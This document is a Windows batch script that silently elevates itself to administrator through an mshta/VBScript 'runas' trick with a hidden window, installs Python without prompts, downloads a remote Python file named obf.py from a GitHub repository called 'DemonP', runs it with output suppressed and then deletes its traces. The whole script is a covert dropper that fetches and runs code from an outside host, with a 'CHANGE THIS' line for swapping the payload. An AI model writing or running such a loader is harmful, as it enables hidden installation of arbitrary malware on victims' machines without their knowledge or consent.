@echo off
:: Silent Admin Install & Execution - No Windows, No Prompts
if not "%1"=="admin" (
    mshta vbscript:Execute("CreateObject(""Shell.Application"").ShellExecute ""cmd.exe"", ""/c """"%~f0"""" admin"", """", ""runas"", 0:close")
    exit /b
)

:: =============================================
:: PART 1: SILENT PYTHON INSTALLATION
:: =============================================
set "pythonURL=https://www.python.org/downloads/windows/"
set "tempDir=%TEMP%\PythonInstall"
set "installer=python_installer.exe"

mkdir "%tempDir%" >nul 2>&1

:: Get latest Python URL silently
powershell -nop -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $url = (irm '%pythonURL%' -UseBasicParsing).Links | ? {$_.href -match 'python-[0-9.]+-amd64\.exe$'} | select -exp href -First 1; $url | Out-File '%tempDir%\latest_url.txt'"

set /p latestURL=<"%tempDir%\latest_url.txt"

if "%latestURL%"=="" exit /b

:: Silent download
powershell -nop -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr '%latestURL%' -OutFile '%tempDir%\%installer%' -UseBasicParsing"

:: Silent install
start /wait "" "%tempDir%\%installer%" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 Shortcuts=0 TargetDir="C:\Python" /log "%tempDir%\python_install.log"

:: Update PATH for current session
set PATH=%PATH%;C:\Python;C:\Python\Scripts

:: =============================================
:: PART 2: SILENT SCRIPT DOWNLOAD & EXECUTION
:: =============================================
set "scriptURL=https://github.com/abidsh540/DemonP/raw/refs/heads/main/obf.py"  :: CHANGE THIS
set "scriptPath=%TEMP%\remote_script.py"

:: Silent download
powershell -nop -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr '%scriptURL%' -OutFile '%scriptPath%' -UseBasicParsing"

:: Silent execution
python "%scriptPath%" >nul 2>&1

:: Cleanup
del /f /q "%tempDir%\%installer%" >nul 2>&1
del /f /q "%scriptPath%" >nul 2>&1
rmdir /q /s "%tempDir%" >nul 2>&1